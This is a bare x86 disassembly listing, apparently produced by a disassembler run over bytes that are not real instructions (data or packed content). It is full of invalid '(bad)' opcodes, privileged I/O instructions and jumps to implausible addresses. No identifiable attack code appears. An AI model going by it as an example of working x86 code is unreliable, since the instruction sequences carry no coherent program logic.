  431b70:	test   BYTE PTR [edi],ah
  431b72:	add    bh,BYTE PTR [ebp+0x0]
  431b75:	add    ebx,DWORD PTR [ebp-0x77]
  431b78:	mov    edi,eax
  431b7a:	cmp    al,0x0
  431b7d:	adc    dh,BYTE PTR [ebx]
  431b7f:	jge    0x431b84
  431b81:	mov    edi,DWORD PTR [ebx]
  431b83:	jl     0x431b94
  431b85:	clc    
  431b86:	dec    edi
  431b87:	jge    0x431b89
  431b89:	mov    eax,DWORD PTR [ebx]
  431b8b:	jb     0x431b95
  431b8d:	mov    ecx,DWORD PTR [ebp-0x8]
  431b90:	mov    edi,edi
  431b92:	xor    edx,DWORD PTR [eax]
  431b94:	add    edi,DWORD PTR [ebx]
  431b96:	mov    DWORD PTR [ebp-0x10],edi
  431b99:	inc    edi
  431b9a:	pop    ebp
  431b9b:	jge    0x431bd8
  431b9d:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  431ba1:	mov    edx,0xc05d87f0
  431ba6:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  431baa:	fimul  WORD PTR [eax]
  431bac:	fist   WORD PTR [ebp+0x1c]
  431baf:	in     al,dx
  431bb0:	jne    0x431b9e
  431bb2:	mov    edi,DWORD PTR [edx-0x7a27a10]
  431bb8:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  431bbc:	fdivp  st(0),st
  431bbe:	fild   WORD PTR [ebp+0x4510f85c]
  431bc4:	test   BYTE PTR [ebx+0x4d00fc02],cl
  431bca:	inc    ebp
  431bcb:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  431bd1:	mov    ebp,DWORD PTR [ebx-0x4]
  431bd4:	adc    al,0x8b
  431bd6:	rcl    DWORD PTR [eax],0x48
  431bd9:	mov    esi,0x7080803
  431bde:	fiadd  WORD PTR [ebp+0x4d]
  431be1:	(bad)  
  431be2:	mov    edx,DWORD PTR [edx-0x4]
  431be5:	mov    edx,DWORD PTR [ebp-0x4]
  431be8:	xor    ebx,DWORD PTR [ebx+0x330103]
  431bee:	mov    DWORD PTR [edi+0x872dc],edi
  431bf4:	xlat   BYTE PTR ds:[ebx]
  431bf5:	into   
  431bf6:	ffreep st(6)
  431bf8:	retf   0x6c7
  431bfb:	iret   
  431bfc:	dec    ebp
  431bfd:	inc    ebp
  431bfe:	mov    DWORD PTR [ebx],edi
  431c00:	fmul   QWORD PTR [edi]
  431c02:	dec    ebp
  431c03:	jnp    0x431c38
  431c05:	add    BYTE PTR [ebx],al
  431c07:	mov    ecx,DWORD PTR [esp+edi*8]
  431c0a:	inc    ebp
  431c0b:	dec    ebp
  431c0c:	lea    esi,[ebx]
  431c0e:	add    DWORD PTR [ebx],eax
  431c10:	jb     0x431c4d
  431c12:	add    BYTE PTR [edi],cl
  431c14:	inc    ebp
  431c15:	imul   eax,edi,0x858bd800
  431c1b:	cld    
  431c1c:	clc    
  431c1d:	mov    DWORD PTR [ebp+0x0],eax
  431c20:	inc    DWORD PTR [eax]
  431c22:	or     al,0xde
  431c24:	sbb    bh,0x1
  431c27:	retf   
  431c28:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  431c2f:	dec    ebp
  431c30:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  431c36:	enter  0x12de,0xdf
  431c3a:	inc    ebp
  431c3b:	pop    ebp
  431c3c:	dec    DWORD PTR [ebx-0x257f0ff4]
  431c42:	add    DWORD PTR [edx],edx
  431c44:	add    BYTE PTR [ebp+0x50],dl
  431c47:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  431c4d:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  431c53:	or     ah,al
  431c55:	pop    ss
  431c56:	cdq    
  431c57:	push   ebp
  431c58:	clc    
  431c59:	mov    eax,DWORD PTR [ebp-0x4]
  431c5c:	xor    edx,edx
  431c5e:	add    esi,DWORD PTR [ebx]
  431c60:	cmp    eax,DWORD PTR [ebx]
  431c62:	hlt    
  431c63:	cmp    DWORD PTR [ebx],esp
  431c65:	or     al,BYTE PTR [ebp+0xf]
  431c68:	mov    eax,DWORD PTR [edx]
  431c6a:	loopne 0x431c6c
  431c6c:	(bad)  
  431c6d:	mov    ecx,esi
  431c6f:	cld    
  431c70:	pushf  
  431c71:	pop    ebp
  431c72:	fwait
  431c73:	mov    esi,DWORD PTR [edx]
  431c75:	lock mov eax,eax
  431c78:	adc    BYTE PTR [ebx],al
  431c7a:	or     BYTE PTR [ebx+0x4d001001],0xcf
  431c81:	xor    ebp,DWORD PTR [edi+0x50e45189]
  431c87:	dec    ebp
  431c88:	mov    ecx,DWORD PTR [ebx-0x31390304]
  431c8e:	(bad)  
  431c8f:	iret   
  431c90:	inc    ebp
  431c91:	(bad)  
  431c92:	jne    0x431ce1
  431c94:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  431c9a:	(bad)  
  431c9b:	cmp    ebx,eax
  431c9d:	je     0x431c25
  431c9f:	add    edi,edi
  431ca1:	or     bh,bh
  431ca3:	dec    ebp
  431ca4:	inc    ebp
  431ca5:	mov    esi,DWORD PTR [ebx]
  431ca7:	cld    
  431ca8:	add    ecx,esi
  431caa:	cmp    ecx,DWORD PTR [eax-0xc]
  431cad:	mov    edx,DWORD PTR [edi]
  431caf:	or     BYTE PTR [ebp-0x7c],al
  431cb2:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  431cb8:	test   BYTE PTR [ebx+ebx*4],cl
  431cbb:	inc    ebp
  431cbc:	xor    bh,BYTE PTR [esi]
  431cbe:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  431cc5:	jne    0x431c8e
  431cc7:	mov    ebp,esp
  431cc9:	fcomp  DWORD PTR [ebx]
  431ccb:	add    BYTE PTR [ecx],al
  431ccd:	inc    DWORD PTR [ebp-0x75]
  431cd0:	(bad)  
  431cd1:	cld    
  431cd2:	add    al,0xce
  431cd4:	mov    ecx,edi
  431cd6:	cld    
  431cd7:	inc    ebp
  431cd8:	fidivr WORD PTR [ebx]
  431cda:	fbstp  TBYTE PTR [ebp-0x3e]
  431cdd:	mov    eax,DWORD PTR [eax]
  431cdf:	adc    BYTE PTR [ebx-0x3974038b],cl
  431ce5:	fadd   st,st(7)
  431ce7:	add    BYTE PTR [ebp-0x1],al
  431cea:	mov    ecx,DWORD PTR [esp+edi*8]
  431ced:	inc    ebp
  431cee:	mov    bh,0xc7
  431cf1:	loopne 0x431d38
  431cf3:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  431cf9:	sbb    dh,BYTE PTR [ebx]
  431cfb:	pushf  
  431cfc:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  431d02:	mov    eax,edi
  431d04:	cwde   
  431d05:	inc    ebp
  431d06:	inc    ebp
  431d07:	jne    0x431c94
  431d09:	mov    esp,esp
  431d0b:	clc    
  431d0c:	add    al,0x4d
  431d0e:	mov    DWORD PTR [ebx],esi
  431d10:	or     al,0x33
  431d12:	inc    ebp
  431d13:	lea    ecx,[ebx-0x398d13fd]
  431d19:	add    bh,al
  431d1b:	inc    ebp
  431d1c:	ror    DWORD PTR [ebx+0x45d829],0x8b
  431d23:	add    ebp,esp
  431d25:	shufps xmm1,xmm3,0xc7
  431d29:	(bad)  
  431d2a:	jmp    0x74885853
  431d2f:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  431d35:	hlt    
  431d36:	mov    ecx,DWORD PTR [edi]
  431d38:	fadd   DWORD PTR [ebp+0x0]
  431d3b:	xor    ecx,DWORD PTR [edi]
  431d3d:	add    ecx,ecx
  431d3f:	cmp    edi,edi
  431d41:	pmuludq mm7,QWORD PTR [edx+0x50]
  431d45:	(bad)  
  431d46:	jmp    0x431cd3
  431d48:	mov    edi,esp
  431d4a:	or     al,0xc6
  431d4c:	inc    ebp
  431d4d:	(bad)  
  431d4e:	mov    eax,DWORD PTR [ebp+0x10]
  431d51:	jne    0x431cdc
  431d53:	mov    eax,DWORD PTR [ecx]
  431d55:	clc    
  431d56:	add    BYTE PTR [ebp-0x40],cl
  431d59:	xor    edx,DWORD PTR [eax-0x73]
  431d5c:	jne    0x431d5f
  431d5e:	push   DWORD PTR [edx+0x8]
  431d61:	add    BYTE PTR [ebp+0x45],al
  431d64:	mov    ebp,ecx
  431d66:	cld    
  431d67:	add    BYTE PTR [ebp+0x0],cl
  431d6a:	xor    eax,DWORD PTR [ebp+0x3]
  431d6d:	mov    DWORD PTR [ebx],edi
  431d6f:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  431d75:	sub    eax,0x5d330e4d
  431d7a:	lea    esi,[ebx]
  431d7c:	add    DWORD PTR [ebx],eax
  431d7e:	jb     0x431d69
  431d80:	add    BYTE PTR [eax],al
  431d82:	inc    ebp
  431d83:	add    bl,ch
  431d85:	inc    ebp
  431d86:	mov    esi,DWORD PTR [ebx]
  431d88:	or     al,0x3
  431d8a:	(bad)  
  431d8b:	mov    edi,eax
  431d8d:	in     al,dx
  431d8e:	scas   eax,DWORD PTR es:[edi]
  431d8f:	inc    ebp
  431d90:	mov    esi,DWORD PTR [ebx]
  431d92:	in     al,0x3
  431d94:	add    al,0x89
  431d96:	mov    ecx,DWORD PTR [eax+edi*8]
  431d99:	dec    ebp
  431d9a:	(bad)  
  431d9b:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  431da2:	mov    ecx,eax
  431da4:	cld    
  431da5:	push   es
  431da6:	dec    ebp
  431da7:	add    al,0x33
  431da9:	mov    DWORD PTR [ebx],eax
  431dab:	in     al,dx
  431dac:	cmp    DWORD PTR [ebp-0x67],eax
  431daf:	mov    eax,DWORD PTR [ebp-0xba0068]
  431db5:	mov    edx,DWORD PTR [ebp-0x4]
  431db8:	mov    ecx,DWORD PTR [ebp-0x2c]
  431dbb:	xor    eax,DWORD PTR [ebp+0x3]
  431dbe:	cmp    DWORD PTR [ebx],0x8b32749a
  431dc4:	xor    edi,esp
  431dc6:	jmp    0xff771b18
  431dcb:	add    ecx,DWORD PTR [ebp-0x3f]
  431dce:	xor    ebx,DWORD PTR [edi]
  431dd0:	add    eax,ecx
  431dd2:	cmp    ebx,DWORD PTR [eax]
  431dd4:	mov    ecx,DWORD PTR [ebp-0x4]
  431dd7:	mov    ecx,DWORD PTR [eax]
  431dd9:	adc    BYTE PTR [ebp-0x80],al
  431ddc:	jmp    0x431ddf
  431dde:	mov    eax,DWORD PTR [eax]
  431de0:	cld    
  431de1:	mov    bh,0xc6
  431de3:	push   ecx
  431de4:	(bad)  
  431de5:	jne    0x431e45
  431de7:	dec    ecx
  431de9:	or     BYTE PTR [ecx+ebx*1],cl
  431dec:	push   ebp
  431ded:	inc    ebp
  431dee:	in     al,dx
  431def:	add    ebp,esp
  431df1:	or     bh,al
  431df3:	dec    ebp
  431df4:	cld    
  431df5:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  431dfb:	xor    DWORD PTR [edx],0x2
  431dfe:	pushf  
  431dff:	dec    DWORD PTR [ebx+0x45510cf4]
  431e05:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  431e0b:	mov    edx,DWORD PTR [ecx+0xc]
  431e0e:	xor    eax,esi
  431e10:	mov    edx,0xc172c7
  431e15:	inc    ebp
  431e16:	mov    esi,DWORD PTR [ebp+0x8]
  431e19:	mov    eax,edx
  431e1b:	call   0x84c7e510
  431e20:	add    DWORD PTR [ebx-0x76bace00],ebx
  431e26:	mov    ebp,eax
  431e28:	or     BYTE PTR [eax],dl
  431e2a:	jo     0x431e79
  431e2c:	push   edi
  431e2d:	xor    esi,DWORD PTR [ebp+0x3]
  431e30:	(bad)  
  431e31:	pmulhuw mm0,mm1
  431e34:	test   DWORD PTR [ebp-0x8],ecx
  431e37:	mov    DWORD PTR [ebp-0x67],eax
  431e3a:	mov    eax,DWORD PTR [ebp-0x4]
  431e3d:	xor    edi,DWORD PTR [ebp-0x73]
  431e40:	xor    eax,DWORD PTR [ebx]
  431e42:	xor    esi,DWORD PTR [edx+0x3]
  431e45:	add    BYTE PTR [ecx],bh
  431e47:	inc    ebp
  431e48:	(bad)  
  431e49:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  431e4f:	mov    DWORD PTR [eax],0x750f0004
  431e55:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  431e5b:	lock add BYTE PTR [ebp+0x0],cl
  431e5f:	mov    esi,DWORD PTR [ebp-0x18]
  431e62:	mov    ebp,edx
  431e64:	or     al,0x72
  431e66:	ja     0x431e68
  431e68:	mov    edx,esi
  431e6a:	cld    
  431e6b:	(bad)  
  431e6e:	cli    
  431e6f:	mov    esi,DWORD PTR [ebp-0x4]
  431e72:	cmp    ecx,esi
  431e74:	bswap  edi
  431e76:	(bad)
  431e7a:	mov    esi,DWORD PTR [ebp-0x4]
  431e7d:	mov    esi,ecx
  431e7f:	clc    
  431e80:	repnz add esi,DWORD PTR [ebp+0x45]
  431e84:	push   ebx
  431e85:	xor    eax,DWORD PTR [ebp+0x3]
  431e88:	cmp    al,0x5f
  431e8a:	pushf  
  431e8b:	pop    ebx
  431e8c:	jmp    0x431f53
  431e91:	mov    esi,DWORD PTR [ebp-0x7d]
  431e94:	xor    ebp,DWORD PTR [eax]
  431e96:	lea    eax,[ebp-0x8]
  431e99:	xor    edx,esi
  431e9b:	pushf  
  431e9c:	out    dx,eax
  431e9d:	(bad)  
  431e9e:	neg    eax
  431ea0:	ins    DWORD PTR es:[edi],dx
  431ea1:	test   esi,edi
  431ea3:	clc    
  431ea4:	pop    esp
  431ea5:	inc    ebp
  431ea6:	or     BYTE PTR [ecx+0x450f0c7d],cl
  431eac:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  431eb2:	add    cl,al
  431eb4:	jne    0x431e51
  431eb6:	mov    esi,DWORD PTR [edx]
  431eb8:	in     al,dx
  431eb9:	push   esi
  431eba:	xor    BYTE PTR [ebp-0xe],dh
  431ebd:	add    edi,esi
  431ebf:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  431ec5:	add    cl,bh
  431ec7:	mov    edi,DWORD PTR [ebp+0x8]
  431eca:	mov    DWORD PTR [ebp-0x14],esi
  431ecd:	add    esi,DWORD PTR [ebp+0x3c]
  431ed0:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  431ed6:	mov    ah,0x3e
  431ed8:	fwait
  431ed9:	pushf  
  431eda:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  431ee0:	jne    0x431e6d
  431ee2:	mov    ecx,DWORD PTR [esp+ebp*8]
  431ee5:	icebp  
  431ee6:	icebp  
  431ee7:	shl    edx,0xf2
  431eea:	(bad)  
  431eeb:	mov    ah,0x16
  431eed:	push   eax
  431eee:	jne    0x431e83
  431ef0:	mov    ecx,DWORD PTR [edi]
  431ef2:	in     al,dx
  431ef3:	jmp    0x431ee6
  431ef5:	add    dl,dh
  431ef7:	mov    edi,esi
  431ef9:	or     al,0x8
  431efb:	inc    ebp
  431efc:	jne    0x431f01
  431efe:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  431f04:	ret    
  431f05:	or     bh,bh
  431f07:	jge    0x431ef1
  431f09:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  431f0f:	xor    edi,eax
  431f11:	add    esi,DWORD PTR [ebp-0x77]
  431f14:	mov    ebx,esp
  431f16:	clc    
  431f17:	neg    DWORD PTR [ebp-0x7c]
  431f1a:	xor    eax,DWORD PTR [eax]
  431f1c:	cmp    eax,DWORD PTR [eax]
  431f1e:	repz jne 0x431eb6
  431f21:	xor    eax,DWORD PTR [ecx]
  431f23:	add    ebx,DWORD PTR [eax]
  431f25:	mov    DWORD PTR [ebp-0x8],eax
  431f28:	mov    eax,edi
  431f2a:	cld    
  431f2b:	lock pop eax
  431f2d:	test   DWORD PTR [ebx],esi
  431f2f:	clc    
  431f30:	add    edx,DWORD PTR [edi-0x740bff77]
  431f36:	fdivp  st(4),st
  431f38:	test   ecx,esi
  431f3a:	(bad)  
  431f3b:	jnp    0x431f3c
  431f3d:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  431f43:	jae    0x431ed0
  431f45:	sub    edi,esp
  431f47:	(bad)  
  431f48:	shl    DWORD PTR [eax-0x3e],0x89
  431f4c:	leave  
  431f4d:	call   0x8198d65a
  431f52:	in     al,dx
  431f53:	(bad)  
  431f54:	in     al,dx
  431f55:	add    bh,al
  431f57:	mov    esp,edi
  431f59:	in     al,dx
  431f5a:	test   DWORD PTR [ebp-0x8],edi
  431f5d:	mov    eax,DWORD PTR [ebp+0x2b]
  431f60:	xor    al,BYTE PTR [ebx]
  431f62:	pushf  
  431f63:	jnp    0x57321b9c
  431f69:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  431f6d:	loopne 0x431fa2
  431f6f:	jne    0x431f2c
  431f71:	mov    esi,DWORD PTR [edx-0x20]
  431f74:	add    BYTE PTR [ebp-0x3d],bh
  431f77:	xor    eax,DWORD PTR [ebp-0x73]
  431f7a:	mov    edi,DWORD PTR [esi]
  431f7c:	cld    
  431f7d:	jb     0x431f45
  431f7f:	add    bl,al
  431f81:	jne    0x431fc8
  431f83:	mov    edx,DWORD PTR [edi-0x10]
  431f86:	jge    0x432005
  431f88:	mov    esi,DWORD PTR [ebx]
  431f8a:	lock add ecx,DWORD PTR [ebp+0x3b]
  431f8e:	xor    esi,DWORD PTR [ebp-0x77]
  431f91:	mov    esi,eax
  431f93:	lock inc ebp
  431f95:	jge    0x431fc8
  431f97:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  431f9e:	dec    ebp
  431f9f:	mov    esi,DWORD PTR [ebx]
  431fa1:	loopne 0x431f2c
  431fa3:	jge    0x431f9d
  431fa5:	add    DWORD PTR [ebp-0x7d],eax
  431fa8:	icebp  
  431fa9:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  431fb0:	dec    ebp
  431fb1:	hlt    
  431fb2:	xor    ebx,DWORD PTR [ebp-0x77]
  431fb5:	mov    esi,esp
  431fb7:	in     al,0x45
  431fb9:	jge    0x431ff8
  431fbb:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  431fc2:	dec    ebp
  431fc3:	push   esp
  431fc4:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  431fca:	inc    ebp
  431fcb:	hlt    
  431fcc:	xor    DWORD PTR [ebp-0x61],esi
  431fcf:	mov    edi,DWORD PTR [eax+0xf19504]
  431fd5:	repnz mov DWORD PTR [ebp+0x20],ebx
  431fd9:	cmp    eax,DWORD PTR [ebp+0xf]
  431fdc:	test   DWORD PTR [edi+ecx*1-0x1],edx
  431fe0:	fistp  WORD PTR [ebx+0x0]
  431fe3:	inc    ebp
  431fe4:	mov    ebx,DWORD PTR [edi+0xc]
  431fe7:	add    eax,eax
  431fe9:	inc    ebp
  431fea:	test   BYTE PTR [ebx],dh
  431fec:	add    eax,DWORD PTR [ebx]
  431fee:	add    BYTE PTR [esi+0x45],bl
  431ff1:	ret    0x85
  431ff4:	jnp    0x5443a3c3
  431ffa:	inc    bp
  431ffc:	inc    ebp
  431ffd:	xor    DWORD PTR [ecx+0xc78a9c],edi
  432003:	fdiv   QWORD PTR [ebx]
  432005:	test   DWORD PTR [ecx+0x453bf8],edi
  43200b:	push   ebx
  43200c:	add    edi,DWORD PTR [esi+0x708088b]
  432012:	cmp    esi,eax
  432014:	setnp  BYTE PTR [ecx-0x74fcffce]
  43201b:	mov    esp,edi
  43201d:	call   0x33ce656f
  432022:	or     BYTE PTR [ebx],al
  432024:	inc    ecx
  432025:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  43202b:	and    BYTE PTR [ebp-0x7074f0bb],al
  432031:	lock add cl,al
  432034:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  43203b:	mov    ch,0x45
  43203d:	clc    
  43203e:	xor    eax,DWORD PTR [ebp+0x3]
  432041:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  432047:	inc    ebp
  432048:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  43204e:	mov    edi,eax
  432050:	mov    eax,DWORD PTR [ebp+0x3c]
  432053:	mov    ecx,DWORD PTR [eax]
  432055:	hlt    
  432056:	inc    ebp
  432057:	ror    DWORD PTR [ebx+0x818c45],0xf4
  43205e:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  432064:	push   ebp
  432065:	mov    edi,DWORD PTR [ebx]
  432067:	in     al,dx
  432068:	jne    0x43202b
  43206a:	mov    eax,DWORD PTR [ebp-0x28]
  43206d:	add    DWORD PTR [eax],0xe8058dec
  432073:	clc    
  432074:	mov    esi,DWORD PTR [edi-0x8]
  432077:	add    dh,dl
  432079:	rol    WORD PTR [ebp-0x1],cl
  43207d:	mov    edx,DWORD PTR [eax+0x8]
  432080:	jne    0x432042
  432082:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  432089:	inc    ebp
  43208a:	push   esp
  43208b:	test   DWORD PTR [ecx+0xf],ecx
  43208e:	sub    edx,esp
  432090:	add    eax,DWORD PTR [eax]
  432092:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  432098:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  43209f:	mov    eax,DWORD PTR [ecx]
  4320a1:	and    BYTE PTR [eax],al
  4320a3:	cmp    al,0x10
  4320a5:	add    BYTE PTR [ebp+0x66],al
  4320a8:	inc    ecx
  4320aa:	push   esp
  4320ab:	add    dh,BYTE PTR [ebp+0x0]
  4320ae:	push   edx
  4320af:	enterw 0xc1,0x4d
  4320b4:	mov    esp,DWORD PTR [esi+0x20]
  4320b7:	add    DWORD PTR [ecx-0x7b],eax
  4320ba:	add    eax,DWORD PTR [ebx]
  4320bc:	str    WORD PTR [eax+0x45]
  4320c0:	lea    ecx,[ebx+0x45890801]
  4320c6:	sbb    BYTE PTR [ebx],al
  4320c8:	dec    ebp
  4320c9:	cmp    al,0xf
  4320cb:	inc    ebp
  4320cc:	push   eax
  4320cd:	mov    esi,DWORD PTR [ebx]
  4320cf:	push   eax
  4320d0:	add    eax,eax
  4320d2:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  4320d9:	inc    ebp
  4320da:	add    BYTE PTR [ecx],dh
  4320dc:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  4320e3:	(bad)  
  4320e4:	mov    ebx,eax
  4320e6:	loopne 0x43212d
  4320e8:	dec    ebp
  4320e9:	mov    ecx,DWORD PTR [edi]
  4320eb:	cld    
  4320ec:	push   eax
  4320ed:	xchg   DWORD PTR [ebx],esi
  4320ef:	add    DWORD PTR [ebx],ebp
  4320f1:	add    BYTE PTR [ebx],ch
  4320f3:	or     BYTE PTR [ecx],bh
  4320f5:	dec    ecx
  4320f6:	loopne 0x4320fb
  4320f8:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  4320fe:	push   ebp
  4320ff:	add    DWORD PTR [ebx+0x55100800],eax
  432105:	dec    ebp
  432106:	jmp    0x432091
  432108:	mov    esp,DWORD PTR [eax]
  43210a:	sbb    dl,dl
  43210c:	inc    eax
  43210d:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  432113:	add    BYTE PTR [ebx+0x74528555],cl
  432119:	push   ebp
  43211a:	div    DWORD PTR [ebx]
  43211c:	and    eax,DWORD PTR [ebx]
  43211e:	add    edx,DWORD PTR [edx-0x30]
  432121:	jno    0x4320ae
  432123:	inc    DWORD PTR [eax+eiz*1]
  432126:	inc    ebp
  432127:	push   eax
  432128:	push   eax
  432129:	mov    esp,DWORD PTR [edi-0x74beff1c]
  43212f:	mov    edi,esp
  432131:	push   eax
  432132:	inc    ebp
  432133:	enter  0x458b,0x8
  432137:	push   ecx
  432138:	(bad)  
  432139:	call   0x10d2b11
  43213e:	pop    ss
  43213f:	push   ebp
  432140:	mov    ecx,DWORD PTR [ebx+0x489408]
  432146:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  43214c:	push   ecx
  43214d:	jo     0x432137
  43214f:	inc    DWORD PTR [edi]
  432151:	or     BYTE PTR [eax],al
  432153:	call   0xce289d
  432158:	fmul   QWORD PTR [ebp+0x55]
  43215b:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  432161:	mov    bh,0x8c
  432163:	adc    al,0x9b
  432165:	dec    esp
  432166:	xor    bl,BYTE PTR [eax]
  432168:	mov    ecx,DWORD PTR [ebp+0xc]
  43216b:	mov    eax,DWORD PTR [ebp-0x4]
  43216e:	mov    esi,DWORD PTR [edi-0x3148f924]
  432174:	push   es
  432175:	retf   
  432176:	mov    BYTE PTR [ebp-0x30],0x3b
  43217a:	inc    ebp
  43217b:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  432182:	retf   0x83fc
  432185:	into   
  432186:	dec    ebp
  432187:	retf   
  432188:	mov    ecx,DWORD PTR [ebp-0x74]
  43218b:	mov    eax,DWORD PTR [eax]
  43218d:	fdiv   QWORD PTR [ebx]
  43218f:	mov    bh,0x3
  432191:	push   es
  432192:	mov    esi,ecx
  432194:	sbb    cl,dl
  432196:	dec    ebp
  432197:	sar    DWORD PTR [ebx],cl
  432199:	push   ebp
  43219a:	jne    0x4321ab
  43219c:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  4321a2:	lea    ebx,[eax]
  4321a4:	call   0xf4ccad6b
  4321a9:	sbb    dh,dl
  4321ab:	add    edx,ebx
  4321ad:	push   ebp
  4321ae:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  4321b4:	push   ecx
  4321b5:	mov    DWORD PTR [eax-0x30],edx
  4321b8:	test   DWORD PTR [edx],eax
  4321ba:	xadd   esp,esi
  4321bd:	pop    es
  4321be:	add    cl,dl
  4321c0:	mov    eax,ecx
  4321c2:	or     al,0x45
  4321c4:	(bad)  
  4321c5:	push   eax
  4321c6:	add    DWORD PTR [edx+0x0],eax
  4321c9:	add    ecx,DWORD PTR [ecx]
  4321cb:	and    dh,cl
  4321cd:	call   0xc72a9d
  4321d2:	add    DWORD PTR [ebp+0x0],edx
  4321d5:	mov    esp,DWORD PTR [ebp+0x18]
  4321d8:	add    BYTE PTR [eax+0x50],cl
  4321db:	xor    eax,DWORD PTR [eax]
  4321dd:	add    esp,DWORD PTR [esi+0x3b]
  4321e0:	inc    ebp
  4321e1:	je     0x432166
  4321e3:	push   ecx
  4321e4:	dec    BYTE PTR [ebp-0x77]
  4321e7:	add    eax,esi
  4321e9:	or     al,0x5e
  4321eb:	inc    eax
  4321ec:	add    BYTE PTR [ebx],al
  4321ee:	data16 and BYTE PTR [ebp+0x50],al
  4321f2:	sub    DWORD PTR [ecx],0xfffffff8
  4321f5:	add    BYTE PTR [ebp-0x75],ah
  4321f8:	add    BYTE PTR [eax],bl
  4321fa:	enter  0x894d,0x8b
  4321fe:	int3   
  4321ff:	loopne 0x4321c3
  432201:	rol    BYTE PTR [eax],0x33
  432204:	lea    cx,[ebp+0xa]
  432208:	data16 jb 0x432250
  43220b:	add    BYTE PTR [ebx+0x44890855],cl
  432211:	sbb    ah,al
  432213:	inc    ebp
  432214:	cmp    al,0xf
  432216:	add    BYTE PTR [edx+0x66],dl
  432219:	xor    ecx,DWORD PTR [eax]
  43221b:	sub    eax,DWORD PTR [edx]
  43221d:	mov    eax,DWORD PTR [eax]
  43221f:	or     al,0x66
  432221:	ror    edx,cl
  432223:	dec    ebp
  432224:	inc    ebp
  432225:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  43222b:	cld    
  43222c:	or     BYTE PTR [edi+0x4501dd],dl
  432232:	ret    0xecce
  432235:	retf   
  432236:	(bad)  
  432237:	dec    ebp
  432238:	mov    al,0x8b
  43223a:	loopne 0x43225c
  43223c:	cmp    ecx,DWORD PTR [edx]
  43223e:	inc    ebp
  43223f:	daa    
  432240:	loopne 0x4321c9
  432242:	in     al,dx
  432243:	add    edi,eax
  432245:	add    BYTE PTR [eax+0x3f52e155],bh
  43224b:	push   ebp
  43224c:	inc    ebp
  43224d:	xor    ebx,edx
  43224f:	add    ebp,esp
  432251:	push   edx
  432252:	push   bp
  432254:	inc    ebp
  432255:	(bad)  
  432256:	in     eax,dx
  432257:	push   esp
  432258:	(bad)  
  432259:	inc    edx
  43225b:	sbb    al,0x33
  43225d:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  432264:	add    BYTE PTR [ebp+0x46],0x8b
  432268:	jmp    0xf98b:0x100041c8
  43226f:	xor    esi,DWORD PTR [edx+0x3]
  432272:	mov    ecx,DWORD PTR [edi]
  432274:	fmul   DWORD PTR [edx]
  432276:	add    BYTE PTR [eax],al
  432278:	lea    eax,[ebx-0x4700273c]
  43227e:	add    al,0x4f
  432280:	pop    DWORD PTR [eax]
  432282:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  432288:	push   edx
  432289:	inc    WORD PTR [ebp+0x8]
  43228d:	mov    eax,0x514f4d
  432292:	(bad)
  432296:	add    al,al
  432298:	xor    DWORD PTR [ebx-0x74baf730],eax
  43229e:	test   DWORD PTR [esi+0x74],esp
  4322a1:	inc    ebp
  4322a2:	mov    DWORD PTR [eax+0xa4e08],edi
  4322a8:	add    BYTE PTR [ecx-0x76c435bb],cl
  4322ae:	or     dh,cl
  4322b0:	or     eax,0x8b8d5045
  4322b5:	inc    ebp
  4322b6:	mov    WORD PTR [ecx+0x3b8a00],?
  4322bc:	jne    0x4322f1
  4322be:	mov    edi,DWORD PTR [edx+0x8f3b18]
  4322c4:	add    DWORD PTR [ebx],eax
  4322c6:	add    bh,bh
  4322c8:	adc    DWORD PTR [eax],ecx
  4322ca:	adc    DWORD PTR [ebp+0x55],edi
  4322cd:	push   es
  4322ce:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  4322d4:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  4322db:	inc    ebp
